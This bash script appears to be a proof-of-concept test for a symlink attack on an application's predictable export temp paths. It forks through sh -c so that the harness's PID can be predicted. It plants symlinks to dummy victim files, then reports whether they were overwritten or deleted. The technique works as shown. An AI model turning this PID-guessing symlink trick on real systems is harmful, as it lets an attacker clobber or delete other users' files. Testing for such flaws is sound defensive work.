#!/bin/bash
# usage: attack_export.sh HARNESS_BIN  -- plants symlinks at the predictable export temp paths
H=$1; A=/tmp/atk_$$; rm -rf $A; mkdir -p $A/dir
echo PRECIOUS > $A/victim.txt; echo KEEPME > $A/dir/keepme.txt
rm -rf /tmp/dvtest_atk; mkdir -p /tmp/dvtest_atk
sh -c "ln -s $A/victim.txt /tmp/dv_svg_export_\$\$.png; ln -s $A/dir /tmp/dv_frames_\$\$; exec env GDK_BACKEND=broadway $H /tmp/dvtest_atk >/dev/null 2>&1"
echo "  victim file content : $(cat $A/victim.txt | head -c 12 | tr -d '\0' | strings | head -1)   (PRECIOUS = untouched)"
echo "  keepme.txt survives : $([ -f $A/dir/keepme.txt ] && echo YES || echo NO-DELETED)"
rm -f /tmp/dv_svg_export_*.png; rm -f /tmp/dv_frames_* 2>/dev/null
